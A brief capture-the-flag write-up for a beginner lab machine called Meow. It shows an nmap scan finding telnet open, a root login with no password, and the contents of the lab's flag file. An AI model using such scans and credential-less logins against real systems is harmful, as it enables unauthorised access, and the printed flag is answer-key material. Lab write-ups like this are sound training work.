# Meow

#startingpoint #telnet #protocols #reconnaissance #weakcredentials #misconfiguration

`nmap` scan shows `telnet` service on port 23:

```
$ nmap -sS -T4 10.129.46.186
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-30 16:45 EDT
Nmap scan report for 10.129.46.186
Host is up (0.031s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE
23/tcp open  telnet

Nmap done: 1 IP address (1 host up) scanned in 0.69 seconds
```

Successfully logged in as `root` with no password:

```
$ telnet 10.129.46.186
...
Meow login: root
```

Reading `flag.txt`:

```
$ cat /root/flag.txt
b40abdfe23665f766f9c61ecba8a4c19
```